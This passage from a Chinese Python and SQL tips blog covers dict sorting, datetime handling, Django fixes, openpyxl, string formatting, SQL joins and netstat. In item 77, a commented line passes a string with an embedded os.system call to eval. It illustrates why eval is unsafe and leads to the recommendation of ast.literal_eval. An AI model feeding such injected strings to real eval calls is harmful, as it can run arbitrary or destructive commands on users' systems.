= False</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="70、字典排序"><a href="#70、字典排序" class="headerlink" title="70、字典排序"></a>70、字典排序</h2><p>字典在内存中发布是无序的，当想对键值或者键名进行排序时可以先把字典转成元组，这可以达到排序的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">score = &#123;&#x27;小明&#x27;: &#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90, &#125;,</span><br><span class="line">     &#x27;小红&#x27;: &#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59, &#125;,</span><br><span class="line">     &#x27;小黑&#x27;: &#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70, &#125;,</span><br><span class="line">     &#x27;小白&#x27;: &#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80, &#125;,</span><br><span class="line">     &#125;</span><br><span class="line"># 对姓名进行排序，即对键名进行排序</span><br><span class="line">b = sorted(score.items(), key=lambda x: x[0], reverse=True)</span><br><span class="line">show_str = &#x27;&#x27;</span><br><span class="line">for info in b:</span><br><span class="line">    # print(info)</span><br><span class="line">    key, value = info[0], info[1]</span><br><span class="line">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\r\n&#x27;</span><br><span class="line">print(&#x27;对姓名进行排序&#x27;)</span><br><span class="line">print(show_str)</span><br><span class="line"># 对平均分进行排序</span><br><span class="line">b = sorted(score.items(), key=lambda x: x[1][&#x27;avg_score&#x27;], reverse=True)</span><br><span class="line">show_str = &#x27;&#x27;</span><br><span class="line">for info in b:</span><br><span class="line">    # print(info)</span><br><span class="line">    key, value = info[0], info[1]</span><br><span class="line">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\r\n&#x27;</span><br><span class="line">print(&#x27;对平均分进行排序&#x27;)</span><br><span class="line">print(show_str)</span><br><span class="line"></span><br><span class="line"># 对英语成绩进行排序</span><br><span class="line">b = sorted(score.items(), key=lambda x: x[1][&#x27;English&#x27;], reverse=True)</span><br><span class="line">show_str = &#x27;&#x27;</span><br><span class="line">for info in b:</span><br><span class="line">    # print(info)</span><br><span class="line">    key, value = info[0], info[1]</span><br><span class="line">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\r\n&#x27;</span><br><span class="line">print(&#x27;对英语成绩进行排序&#x27;)</span><br><span class="line">print(show_str)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">对姓名进行排序</span><br><span class="line">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class="line">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br><span class="line">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class="line">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class="line"></span><br><span class="line">对平均分进行排序</span><br><span class="line">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class="line">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class="line">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class="line">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br><span class="line"></span><br><span class="line">对英语成绩进行排序</span><br><span class="line">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class="line">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class="line">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class="line">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br></pre></td></tr></table></figure><h3 id="对列表中字典按多个键值排序"><a href="#对列表中字典按多个键值排序" class="headerlink" title="对列表中字典按多个键值排序"></a>对列表中字典按多个键值排序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from operator import itemgetter</span><br><span class="line">data = [</span><br><span class="line">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 300, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 2, &#x27;position&#x27;: 255, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 3, &#x27;position&#x27;: 256, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 500, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 5, &#x27;position&#x27;: 455, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 322, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;code&#x27;: 6, &#x27;position&#x27;: 676, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class="line">]</span><br><span class="line">data = sorted(data, key=itemgetter(&#x27;code&#x27;, &#x27;position&#x27;))</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 300, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 322, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 500, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 2, &#x27;position&#x27;: 255, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 3, &#x27;position&#x27;: 256, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 5, &#x27;position&#x27;: 455, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class="line">&#123;&#x27;code&#x27;: 6, &#x27;position&#x27;: 676, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;]</span><br></pre></td></tr></table></figure><h2 id="71、时间格式与字符串互转、比较大小"><a href="#71、时间格式与字符串互转、比较大小" class="headerlink" title="71、时间格式与字符串互转、比较大小"></a>71、时间格式与字符串互转、比较大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line"></span><br><span class="line"># 当前时间转字符串</span><br><span class="line">now = datetime.datetime.strftime(datetime.datetime.now(), &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line"># 字符串转时间格式</span><br><span class="line">now = datetime.datetime.strptime(now, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">a = now + datetime.timedelta(minutes=-15)</span><br><span class="line"># 时间比较大小</span><br><span class="line">if a &lt; now:</span><br><span class="line">    print(&#x27;yes&#x27;)</span><br></pre></td></tr></table></figure><h2 id="72、python把’-u’开头的字符串转中文"><a href="#72、python把’-u’开头的字符串转中文" class="headerlink" title="72、python把’\u’开头的字符串转中文"></a>72、python把’\u’开头的字符串转中文</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str_data = &#x27;\\u7528\\u6237 ID \\u6216\\u5bc6\\u7801\\u9519\\u8bef&#x27;</span><br><span class="line"># 字符串.encode(&#x27;utf-8&#x27;).decode(&#x27;unicode_escape&#x27;)</span><br><span class="line">str_data_to_zh = str_data.encode(&#x27;utf-8&#x27;).decode(&#x27;unicode_escape&#x27;)</span><br><span class="line">print(str_data_to_zh)</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">用户 ID 或密码错误</span><br></pre></td></tr></table></figure><h2 id="73、django进行数据迁移时出现No-changes-detected解决方案"><a href="#73、django进行数据迁移时出现No-changes-detected解决方案" class="headerlink" title="73、django进行数据迁移时出现No changes detected解决方案"></a>73、django进行数据迁移时出现No changes detected解决方案</h2><p>原因：可能是由于app下面没有migrations文件夹<br>所以需要创建这个文件夹，命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations --empty 你的app名称</span><br></pre></td></tr></table></figure><h2 id="74、ubuntu下载文件到windows桌面"><a href="#74、ubuntu下载文件到windows桌面" class="headerlink" title="74、ubuntu下载文件到windows桌面"></a>74、ubuntu下载文件到windows桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install lrzsz</span><br><span class="line">sz 123.txt</span><br></pre></td></tr></table></figure><h2 id="75、git查看提交日志"><a href="#75、git查看提交日志" class="headerlink" title="75、git查看提交日志"></a>75、git查看提交日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --author=&quot;ldc&quot;</span><br></pre></td></tr></table></figure><h2 id="76、python翻译模块"><a href="#76、python翻译模块" class="headerlink" title="76、python翻译模块"></a>76、python翻译模块</h2><p>可以把英文翻译成中文，也可以把中文翻译成英文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pip install  translate</span><br><span class="line"></span><br><span class="line">from translate import Translator</span><br><span class="line"></span><br><span class="line">name = &#x27;giant panda, panda, panda bear, coon bear, Ailuropoda melanoleuca&#x27;</span><br><span class="line">translator = Translator(to_lang=&quot;chinese&quot;)</span><br><span class="line">translation = translator.translate(name)</span><br><span class="line">print(translation)</span><br><span class="line"></span><br><span class="line">translator= Translator(from_lang=&quot;chinese&quot;,to_lang=&quot;english&quot;)</span><br><span class="line">translation = translator.translate(&quot;我想你&quot;)</span><br><span class="line">print(translation)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">大熊猫，熊猫，熊猫熊，浣熊，大熊猫</span><br><span class="line">I missed you.</span><br></pre></td></tr></table></figure><h2 id="77、python实现字符串转字典"><a href="#77、python实现字符串转字典" class="headerlink" title="77、python实现字符串转字典"></a>77、python实现字符串转字典</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">target_str = &#x27;&#123;&quot;h&quot;: 1, &quot;e&quot;: 2, &quot;l&quot;: 3, &quot;l&quot;: 4, &quot;o&quot;: 5&#125;&#x27;</span><br><span class="line">target_str2 = &quot;&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 3, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 方式1：使用json，缺点，字符串中不能出现单引号</span><br><span class="line"># 由于 json 语法规定 数组或对象之中的字符串必须使用双引号，不能使用单引号</span><br><span class="line"># 官网https://www.json.org/json-en.html上有一段描述是</span><br><span class="line"># A string is a sequence of zero or more Unicode characters, wrapped in double quotes, using backslash escapes</span><br><span class="line">print(json.loads(target_str))</span><br><span class="line"># print(json.loads(target_str2))   # 使用json转这个字符串会报错 Expecting property name enclosed in double quotes</span><br><span class="line"></span><br><span class="line"># 方式2：使用eval函数，缺点，不安全</span><br><span class="line">print(eval(target_str))</span><br><span class="line">print(eval(target_str2))</span><br><span class="line"># print(eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;))  # 会列出当前的目录文件，如果字符串是一些删除命令，则可以把整个目录清空！</span><br><span class="line"></span><br><span class="line"># 方式3，使用ast.literal_eval，没有json与eval的缺点，推荐使用这个</span><br><span class="line">print(ast.literal_eval(target_str))</span><br><span class="line">print(ast.literal_eval(target_str2))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br></pre></td></tr></table></figure><h2 id="78、django-app-如何在后台显示中文名"><a href="#78、django-app-如何在后台显示中文名" class="headerlink" title="78、django app 如何在后台显示中文名"></a>78、django app 如何在后台显示中文名</h2><p>1.在app (这里以user为例)下面的__init__.py文件中</p><p>添加:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default_app_config = &#x27;user.apps.UserConfig&#x27;</span><br></pre></td></tr></table></figure><p>2.在apps.py中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.apps import AppConfig</span><br><span class="line"></span><br><span class="line">class UserConfig(AppConfig):</span><br><span class="line">    name = &#x27;user&#x27;</span><br><span class="line">    verbose_name = &#x27;用户&#x27;</span><br></pre></td></tr></table></figure><h2 id="79、使用python给Excel指定行添加数据"><a href="#79、使用python给Excel指定行添加数据" class="headerlink" title="79、使用python给Excel指定行添加数据"></a>79、使用python给Excel指定行添加数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl, sys</span><br><span class="line"></span><br><span class="line">wb = openpyxl.load_workbook(&#x27;b.xlsx&#x27;)</span><br><span class="line">sheet = wb[&#x27;Sheet1&#x27;]</span><br><span class="line"></span><br><span class="line"># 在excel表格第二行添加新数据</span><br><span class="line">addrow = 1   # 增加一行</span><br><span class="line">row = 2  # 在第二行新增一行</span><br><span class="line">name = &#x27;b-back.xlsx&#x27; # 新的表名</span><br><span class="line"></span><br><span class="line">wb1 = openpyxl.Workbook()</span><br><span class="line">sheet1 = wb1[&#x27;Sheet&#x27;]</span><br><span class="line"></span><br><span class="line"># 复制前row行</span><br><span class="line">for i in range(1, row):</span><br><span class="line">    for j in range(1, sheet.max_column + 1):</span><br><span class="line">        sheet1.cell(row=i, column=j).value = sheet.cell(row=i, column=j).value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 复制后row行</span><br><span class="line">for i in range(row, sheet.max_row + 1):</span><br><span class="line">    for j in range(1, sheet.max_column + 1):</span><br><span class="line">        if i == row:</span><br><span class="line">            # 给第row行添加新的数据</span><br><span class="line">            sheet1.cell(row=row, column=j).value = &#x27;新增&#x27;</span><br><span class="line">        sheet1.cell(row=i + addrow, column=j).value = sheet.cell(row=i, column=j).value</span><br><span class="line"></span><br><span class="line">wb1.save(name)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200526120005871.png" alt="在这里插入图片描述"></p><h2 id="80、python中的format格式拼接字符串"><a href="#80、python中的format格式拼接字符串" class="headerlink" title="80、python中的format格式拼接字符串"></a>80、python中的format格式拼接字符串</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3, &#x27;d&#x27;: 5&#125;</span><br><span class="line"></span><br><span class="line">print(&#x27;&#123;a&#125;,&#123;b&#125;&#x27;.format(**d))</span><br><span class="line">print(&#x27;&#123;0&#125;,&#123;1&#125;,&#123;0&#125;&#x27;.format(&#x27;a&#x27;, &#x27;b&#x27;))</span><br><span class="line">print(f&quot;&#123;d[&#x27;a&#x27;]&#125;&quot;)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1,2</span><br><span class="line">a,b,a</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="81、数据库inner-join、full-join、left-join、union、union-all区别"><a href="#81、数据库inner-join、full-join、left-join、union、union-all区别" class="headerlink" title="81、数据库inner join、full join、left join、union、union all区别"></a>81、数据库inner join、full join、left join、union、union all区别</h2><p>表a_test</p><p><img src="https://img-blog.csdnimg.cn/20200529102527295.png#pic_center" alt="在这里插入图片描述"></p><p>表b_test</p><p><img src="https://img-blog.csdnimg.cn/20200529102549669.png#pic_center" alt="在这里插入图片描述"></p><p>INNER JOIN</p><p>是A和B的交集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM a_test INNER JOIN b_test ON a_test.name = b_test.namesa</span><br><span class="line"></span><br><span class="line">Inner join 产生的结果集中，是A和B的交集。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102631494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>FULL OUTER JOIN</p><p>产生A和B的并集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM a_test FULL OUTER JOIN b_test ON a_test.name = b_test.name </span><br><span class="line"></span><br><span class="line">Full outer join 产生A和B的并集。</span><br><span class="line">但是需要注意的是，对于没有匹配的记录，则会以null做为值。</span><br><span class="line">可以使用IF NULL判断。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102702865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM a_test FULL OUTER JOIN b_test ON a_test.name = b_test.name</span><br><span class="line">WHERE a_test.id IS null OR b_test.id IS null</span><br><span class="line"></span><br><span class="line">产生A表和B表没有交集的数据集。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102724731.png#pic_center" alt="在这里插入图片描述"></p><p>LEFT [OUTER] JOIN</p><p>产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM a_test LEFT OUTER JOIN b_test ON a_test.name = b_test.name</span><br><span class="line">有些数据库可以不要OUTER</span><br><span class="line">SELECT * FROM a_test LEFT  JOIN b_test ON a_test.name = b_test.name</span><br><span class="line">Left outer join 产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102808618.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM a_test LEFT OUTER JOIN b_test ON a_test.name = b_test.name </span><br><span class="line">WHERE b_test.id IS null</span><br><span class="line"></span><br><span class="line">产生在A表中有而在B表中没有的集合。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102828846.png#pic_center" alt="在这里插入图片描述"></p><p>RIGHT [OUTER] JOIN</p><p>RIGHT OUTER JOIN 是后面的表为基础，与LEFT OUTER JOIN用法类似。</p><p>UNION 与 UNION ALL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</span><br><span class="line">请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。</span><br><span class="line">列也必须拥有相似的数据类型。</span><br><span class="line">同时，每条 SELECT 语句中的列的顺序必须相同。</span><br><span class="line">UNION 只选取记录，而UNION ALL会列出所有记录。</span><br><span class="line"></span><br><span class="line">SELECT name FROM a_test UNION SELECT name FROM b_test</span><br><span class="line"></span><br><span class="line">选取不同值</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102855430.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT a_test.id,a_test.name  FROM a_test </span><br><span class="line">UNION </span><br><span class="line">SELECT b_test.id,b_test.name FROM b_test</span><br><span class="line"></span><br><span class="line">由于 id 51 xh   与 id 4 xh 并不相同，不合并</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102917488.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM a_test UNION ALL SELECT name FROM b_test</span><br><span class="line"></span><br><span class="line">全部列出来</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200529102937801.png#pic_center" alt="在这里插入图片描述"></p><p>还需要注意的是我们还有一个是“交差集” cross join, 这种Join没有办法用文式图表示，因为其就是把表A和表B的数据进行一个N*M的组合，即笛卡尔积。</p><p>表达式如下：SELECT * FROM a_test CROSS JOIN b_test</p><p>这个笛卡尔乘积会产生 4 x 4 &#x3D; 16 条记录，一般来说，我们很少用到这个语法。但是我们得小心，如果不是使用嵌套的select语句，一般系统都会产生笛卡尔乘积然再做过滤。这是对于性能来说是非常危险的，尤其是表很大的时候。</p><h2 id="82、windows电脑查看端口使用情况"><a href="#82、windows电脑查看端口使用情况" class="headerlink" title="82、windows电脑查看端口使用情况"></a>82、windows电脑查看端口使用情况</h2><p>找出8000端口对应的PID进程，命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano|findstr 8000</span><br></pre></td></tr></table></figure><p>进程信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       1620</span><br><span class="line">UDP    0.0.0.0:8000           *:*                                    1620</span><br></pre></td></tr></table></figure><p>找出进程对应的详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 